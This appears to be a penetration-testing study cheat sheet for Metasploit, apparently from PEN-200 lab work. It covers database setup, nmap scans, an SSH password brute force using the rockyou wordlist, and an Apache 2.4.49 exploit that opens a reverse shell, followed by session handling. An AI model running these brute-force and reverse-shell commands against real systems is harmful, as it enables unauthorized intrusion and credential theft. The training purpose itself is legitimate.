---
tags:
---
# metasploit

Exploitation framework

## Capabilities

### Initialization

```bash
# Initialize the database
sudo msfdb init

# Enable the database service at boot time
sudo systemctl enable postgresql

# Start metasploit
sudo msfconsole -q

# Check database status
db_status

# Display modules
show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
```

### Workspaces

```bash
# Display workspaces
workspace

# Create a new workspace
workspace -a pen200
```

### Fundamentals

Command categories

- Core Commands
- Module Commands
- Job Commands
- Resource Script Commands
- Database Backend Commands
- Credentials Backend Commands
- Developer Commands

#### Database Backend Commands

```bash
# Execute nmap within metasploit
db_nmap -A 192.168.50.202

# List discovered hosts
hosts

# List discovered services from nmap scans
services
services -p 8000
```

### Auxiliary Modules

```bash
# SMB auxiliary module command sequence
show auxiliary
search type:auxiliary smb
use 56
info
show options
set RHOSTS 192.168.40.202
# OR set RHOSTs with database
services -p 445 --rhosts
run
vulns

# SSH auxiliary module command sequence
search type:auxiliary ssh
use 15
show options
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME george
set RHOSTS 192.168.50.201
set RPORT 2222
run
creds
```

### Exploit modules

```bash
# Apache exploit module command sequence
workspace -a exploits
search Apache 2.4.49
use 0
info
show options
set payload payload/linux/x64/shell_reverse_tcp
show options
set SSL false
set RPORT 80
set RHOSTS 192.168.50.16
run
# OR run as a job to require us to interact with the session before accessing it
run -j
```

Now inside shell on target

```bash
id

# Background session with Ctrl + z
^Z
y
```

Back in metasploit

```bash
# List sessions
sessions -l

# Interact with a session
sessions -i 2

# Kill a session
sessions -k 2
```
